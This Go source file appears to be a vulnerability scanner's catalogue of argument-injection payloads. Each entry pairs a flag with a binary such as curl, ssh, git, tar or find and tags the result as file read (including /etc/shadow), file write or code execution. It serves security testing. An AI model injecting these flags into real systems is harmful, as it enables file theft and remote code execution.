// Package arginject provides Argument Injection payloads.
//
// Argument injection differs from command injection: the attacker does
// not introduce a new command, only an additional flag/argument to a
// pre-existing wrapped binary. The sink looks like
//
//	exec.Command("curl", userInput)
//	exec.Command("git", "clone", userInput, "/tmp/x")
//
// — `userInput` becomes a single argv element. The attacker cannot add
// `;` or `|` to chain commands (no shell), but flag values like
// `--upload-file /etc/passwd` or `-oProxyCommand=...` change the binary's
// behaviour in security-relevant ways: file read, network egress, RCE,
// or escape-to-shell via flag combinations the binary itself executes.
//
// Mirrors AWVS Argument_Injection.script. Each binary needs its own
// flag list because the sinks are not portable.
//
// References: Sonar 2023 "Argument Injection in popular libraries",
// PortSwigger argument-injection cheatsheet, ImageTragick CVE-2016-3714,
// curl --upload-file file-read, ssh -oProxyCommand RCE, find -exec RCE.
package arginject

// Payload represents an argument-injection flag for a specific binary.
type Payload struct {
	Value       string // flag (always starts with `-`)
	Binary      string // target binary (lowercased, e.g. "curl", "ssh")
	Impact      Impact // resulting capability if injected
	Description string
}

// Impact classifies what an injected flag yields if accepted.
type Impact string

const (
	ImpactFileRead     Impact = "file_read"
	ImpactFileWrite    Impact = "file_write"
	ImpactRCE          Impact = "rce"
	ImpactSSRF         Impact = "ssrf"
	ImpactInfoLeak     Impact = "info_leak"
	ImpactConfigChange Impact = "config_change"
)

// GetPayloads returns all argument-injection payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetByBinary returns payloads targeting the named binary.
func GetByBinary(binary string) []Payload {
	var out []Payload
	for _, p := range payloads {
		if p.Binary == binary {
			out = append(out, p)
		}
	}
	return out
}

// SupportedBinaries returns the set of binaries with at least one payload.
func SupportedBinaries() []string {
	seen := make(map[string]bool)
	var out []string
	for _, p := range payloads {
		if !seen[p.Binary] {
			seen[p.Binary] = true
			out = append(out, p.Binary)
		}
	}
	return out
}

var payloads = []Payload{
	// --- curl ---
	{Binary: "curl", Value: "--upload-file /etc/passwd", Impact: ImpactFileRead, Description: "curl PUT-upload local file to attacker (read)"},
	{Binary: "curl", Value: "-T /etc/passwd", Impact: ImpactFileRead, Description: "curl short --upload-file"},
	{Binary: "curl", Value: "-o /tmp/poc.html", Impact: ImpactFileWrite, Description: "curl write attacker response to chosen path"},
	{Binary: "curl", Value: "--config /etc/passwd", Impact: ImpactFileRead, Description: "curl parse local file as config (echoes errors → file leak)"},
	{Binary: "curl", Value: "-K /etc/passwd", Impact: ImpactFileRead, Description: "curl short --config"},
	{Binary: "curl", Value: "--trace /tmp/trace.txt", Impact: ImpactFileWrite, Description: "curl write request/response trace"},

	// --- wget ---
	{Binary: "wget", Value: "--output-document=/tmp/x", Impact: ImpactFileWrite, Description: "wget write-anywhere via -O"},
	{Binary: "wget", Value: "--input-file=/etc/passwd", Impact: ImpactFileRead, Description: "wget read local file as URL list (errors leak)"},
	{Binary: "wget", Value: "--use-askpass=/usr/bin/touch", Impact: ImpactRCE, Description: "wget --use-askpass arbitrary-binary exec"},

	// --- ssh / scp ---
	{Binary: "ssh", Value: "-oProxyCommand=touch /tmp/pwn", Impact: ImpactRCE, Description: "ssh -oProxyCommand RCE (executed before connect)"},
	{Binary: "ssh", Value: "-F /etc/passwd", Impact: ImpactFileRead, Description: "ssh use file as config (parse errors leak content)"},
	{Binary: "ssh", Value: "-oIdentityFile=/etc/shadow", Impact: ImpactFileRead, Description: "ssh load file as private key (errors leak content)"},
	{Binary: "scp", Value: "-S /usr/bin/touch", Impact: ImpactRCE, Description: "scp -S arbitrary-program execution"},

	// --- git ---
	{Binary: "git", Value: "--upload-pack=touch /tmp/pwn", Impact: ImpactRCE, Description: "git clone --upload-pack RCE (CVE-2017-1000117 family)"},
	{Binary: "git", Value: "-c core.sshCommand=touch /tmp/pwn", Impact: ImpactRCE, Description: "git -c core.sshCommand RCE"},
	{Binary: "git", Value: "--config-env=user.name=POC", Impact: ImpactConfigChange, Description: "git config-env arbitrary config override"},

	// --- tar ---
	{Binary: "tar", Value: "--checkpoint-action=exec=touch /tmp/pwn", Impact: ImpactRCE, Description: "tar checkpoint-action RCE"},
	{Binary: "tar", Value: "--to-command=touch /tmp/pwn", Impact: ImpactRCE, Description: "tar --to-command RCE"},
	{Binary: "tar", Value: "-I /usr/bin/touch", Impact: ImpactRCE, Description: "tar -I (--use-compress-program) arbitrary-binary exec"},

	// --- find ---
	{Binary: "find", Value: "-exec touch /tmp/pwn ;", Impact: ImpactRCE, Description: "find -exec RCE"},
	{Binary: "find", Value: "-fprintf /tmp/pwn POC", Impact: ImpactFileWrite, Description: "find -fprintf arbitrary file write"},
	{Binary: "find", Value: "-printf %p", Impact: ImpactInfoLeak, Description: "find -printf format-string leak"},

	// --- ImageMagick / convert (ImageTragick + filename pipes) ---
	{Binary: "convert", Value: "-write |touch /tmp/pwn", Impact: ImpactRCE, Description: "ImageMagick -write |cmd shell escape"},
	{Binary: "convert", Value: "-set option:filename:tmp /etc/passwd", Impact: ImpactFileRead, Description: "ImageMagick set option file-read"},
	// --- mysql / mysqldump ---
	{Binary: "mysql", Value: "--init-command=SELECT LOAD_FILE('/etc/passwd')", Impact: ImpactFileRead, Description: "mysql --init-command file read"},
	{Binary: "mysqldump", Value: "--tab=/tmp", Impact: ImpactFileWrite, Description: "mysqldump --tab arbitrary write"},

	// --- python / php / ruby / perl (interpreters used as wrapped binaries) ---
	{Binary: "python", Value: "-c__import__('os').system('touch /tmp/pwn')", Impact: ImpactRCE, Description: "python -c inline RCE"},
	{Binary: "php", Value: "-r system('touch /tmp/pwn');", Impact: ImpactRCE, Description: "php -r inline RCE"},
	{Binary: "ruby", Value: "-e system('touch /tmp/pwn')", Impact: ImpactRCE, Description: "ruby -e inline RCE"},
	{Binary: "perl", Value: "-e system('touch /tmp/pwn')", Impact: ImpactRCE, Description: "perl -e inline RCE"},

	// --- zip / unzip ---
	{Binary: "zip", Value: "--unzip-command=touch /tmp/pwn", Impact: ImpactRCE, Description: "zip --unzip-command RCE"},
	{Binary: "zip", Value: "-T --unzip-command=id", Impact: ImpactRCE, Description: "zip test-with --unzip-command"},

	// --- rsync ---
	{Binary: "rsync", Value: "-e 'sh -c \"touch /tmp/pwn\"'", Impact: ImpactRCE, Description: "rsync -e arbitrary remote-shell"},

	// --- openssl ---
	{Binary: "openssl", Value: "-config /etc/passwd", Impact: ImpactFileRead, Description: "openssl -config parse-as-config leak"},
}
